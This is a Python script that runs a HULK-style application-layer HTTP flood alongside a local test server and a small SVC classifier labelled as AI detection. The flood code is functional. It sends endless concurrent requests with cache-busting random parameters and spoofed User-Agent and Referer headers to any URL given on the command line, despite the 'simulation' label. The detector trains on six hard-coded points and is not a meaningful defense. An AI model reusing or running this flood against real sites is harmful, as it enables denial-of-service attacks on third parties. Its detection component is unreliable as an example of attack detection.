import asyncio
import sys
import random
import string
import time
from aiohttp import web, ClientSession
import numpy as np
from sklearn.svm import SVC

# --- HULK Technique Data ---
# A list of common User-Agents to mimic legitimate traffic
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15',
    'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.128 Mobile Safari/537.36',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0'
]
# A list of referers to make traffic look like it came from a popular site
REFERERS = [
    'https://www.google.com/',
    'https://www.facebook.com/',
    'https://www.twitter.com/',
    'https://duckduckgo.com/'
]

# --- 1. THE DEFENSE/TARGET SYSTEM (Server running locally) ---
class DDoSEngine:
    """The simulated Target Web Server."""
    def __init__(self):
        self.request_count = 0
        self.start_time = time.time()
        self.runner = None

    async def handle_request(self, request):
        """Simulates processing a heavy request."""
        self.request_count += 1
        
        # Simulate processing time based on HULK's cache-bypass
        # A real server would be slowed down by this.
        await asyncio.sleep(0.005) 
        
        return web.Response(text="Server OK: Request processed")

    async def create_server(self, host='127.0.0.1', port=8080):
        """Sets up the asynchronous web server."""
        router = web.Application()
        router.router.add_get('/', self.handle_request)
        self.runner = web.AppRunner(router)
        await self.runner.setup()
        site = web.TCPSite(self.runner, host, port)
        await site.start()
        print(f"DEFENSE: Target server listening on http://{host}:{port}")

# --- 2. THE SIMULATED STRESS TESTER (The Advanced HULK) ---
class AttackSimulation:
    """Simulates a Layer 7 HULK-style attack."""
    def __init__(self, target_url):
        self.target_url = target_url
        self.active_connections = 0

    def generate_headers(self):
        """Generates randomized headers for cache evasion."""
        return {
            'User-Agent': random.choice(USER_AGENTS),
            'Referer': random.choice(REFERERS),
            'Cache-Control': 'no-cache',
            'Connection': 'Keep-Alive'
        }

    def generate_unique_url(self):
        """Adds a random parameter to bypass caching (HULK technique)."""
        random_str = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
        # Appends a unique, random string to the URL path
        if '?' in self.target_url:
            return f"{self.target_url}&v={random_str}"
        return f"{self.target_url}?v={random_str}"

    async def send_hulk_request(self, session):
        """Sends a single, unique HTTPS request."""
        url = self.generate_unique_url()
        headers = self.generate_headers()
        
        self.active_connections += 1
        
        try:
            # Use aiohttp to send the request
            async with session.get(url, headers=headers, timeout=5) as response:
                pass # We don't need the response content, just the load impact
        except Exception as e:
            # Catch timeouts, connection errors, etc.
            # print(f"Attack failed: {type(e).__name__}")
            pass
        finally:
            self.active_connections -= 1

    async def start_flood(self, num_tasks=500):
        """Starts a high-concurrency flood of requests."""
        print(f"\nSTRESS TEST: Launching {num_tasks} continuous attack tasks to {self.target_url}")
        print("ATTACK: Press Ctrl+C to stop the simulation.")
        
        # We use a context manager for the session
        async with ClientSession() as session:
            # Create a large number of concurrent, continuous tasks
            tasks = []
            for _ in range(num_tasks):
                tasks.append(asyncio.create_task(self._continuous_request_task(session)))
            
            # Wait for all tasks (which run indefinitely)
            await asyncio.gather(*tasks)

    async def _continuous_request_task(self, session):
        """Runs requests continuously within a single task."""
        while True:
            await self.send_hulk_request(session)
            # Short sleep to prevent immediate busy-looping, allowing context switching
            await asyncio.sleep(random.uniform(0.01, 0.1))

# --- 3. THE MONITORING SYSTEM ---
class MetricsTracker:
    """Collects system metrics required for anomaly detection."""
    def __init__(self):
        self.metrics = {'request_rate': 0, 'active_connections': 0, 'unique_uas': 0}
        self.last_count = 0
        self.last_time = time.time()

    def update(self, attack_sim, defense_engine):
        """Updates metrics based on real-time data."""
        current_time = time.time()
        time_diff = current_time - self.last_time
        
        # Calculate request rate for the defense engine
        current_count = defense_engine.request_count
        rate = (current_count - self.last_count) / time_diff if time_diff > 0 else 0
        
        self.metrics['request_rate'] = round(rate, 2)
        self.metrics['active_connections'] = attack_sim.active_connections 
        self.metrics['unique_uas'] = len(set(USER_AGENTS)) # In a real system, this would be dynamic
        
        self.last_count = current_count
        self.last_time = current_time
        
    def get_metrics(self):
        return list(self.metrics.values())

    def get_metrics_dict(self):
        return self.metrics


# --- 4. THE AI/ML DETECTION SYSTEM ---
class AnomalyDetection:
    """Uses SVC to classify network traffic as Normal (0) or Anomaly (1)."""
    def __init__(self):
        self.model = SVC(kernel='linear', gamma='auto')
        print("DEFENSE: Anomaly Detection Model (SVC) initialized.")

    def train(self):
        """Trains the model based on expected normal and attack traffic patterns."""
        # Features are: [request_rate, active_connections, unique_uas]
        X = np.array([
            # Normal Traffic (Low Rate, few connections) (Label 0)
            [10, 5, 4], [25, 10, 4], [50, 20, 4], 
            # Anomalous/Attack Traffic (High Rate, many connections) (Label 1)
            [300, 100, 4], [500, 250, 4], [800, 400, 4] 
        ])
        
        # y: Labels (0 = Normal, 1 = Attack)
        y = np.array([0, 0, 0, 1, 1, 1])
        
        self.model.fit(X, y)
        print("DEFENSE: Model trained to detect high request rate/connection anomalies.")

    def predict(self, new_data):
        """Predicts if the new metric data indicates an anomaly."""
        return self.model.predict([new_data])[0]

# --- MAIN EXECUTION ---
async def main():
    if len(sys.argv) < 2:
        print("Usage: python ddos_tool_and_detector.py <https://target-url>")
        # Fallback to an example target (the local server)
        target_url = "http://127.0.0.1:8080"
        print(f"INFO: No URL provided. Defaulting target to the local defense engine: {target_url}")
    else:
        target_url = sys.argv[1]
        if not target_url.startswith('https://') and not target_url.startswith('http://'):
             target_url = 'https://' + target_url

    # Initialize all components
    defense_engine = DDoSEngine()
    metrics_tracker = MetricsTracker()
    detector = AnomalyDetection()
    attack_sim = AttackSimulation(target_url)

    # 1. Setup Defense System (Target Web Server and AI Detector)
    detector.train()
    defense_task = asyncio.create_task(defense_engine.create_server())

    # Give the server a moment to start
    await asyncio.sleep(1)

    # 2. Start the Attack Simulation
    attack_task = asyncio.create_task(attack_sim.start_flood(num_tasks=50))
    
    # 3. Continuous Monitoring Loop
    print("\n--- BEGIN AI MONITORING LOOP ---")
    
    while True:
        metrics_tracker.update(attack_sim, defense_engine)
        current_metrics = metrics_tracker.get_metrics()
        current_metrics_dict = metrics_tracker.get_metrics_dict()
        
        if len(current_metrics) < 3: # Skip prediction if metrics are incomplete
            await asyncio.sleep(1)
            continue

        prediction = detector.predict(current_metrics)
        
        status = "NORMAL" if prediction == 0 else "!!! APPLICATION LAYER ATTACK !!!"
        color_code = '\033[92m' if prediction == 0 else '\033[91m' # Green or Red
        
        print(f"{color_code}STATUS: {status:<30} | Rate: {current_metrics_dict['request_rate']:<5} req/s | Conns: {current_metrics_dict['active_connections']:<3} | Total Rcvd: {defense_engine.request_count}\033[0m")
        
        await asyncio.sleep(1) # Monitor every second

if __name__ == "__main__":
    try:
        # Check Python version for running asyncio
        if sys.version_info < (3, 7):
            print("ERROR: This script requires Python 3.7+ to run asyncio properly.")
            sys.exit(1)
        
        asyncio.run(main())
        
    except KeyboardInterrupt:
        print("\n\nSIMULATION STOPPED. Defense and Stress Testing tasks terminated by user (Ctrl+C).")
        # Exit cleanly
        sys.exit(0)
    except Exception as e:
        print(f"An unexpected error occurred: {e}")
        sys.exit(1)
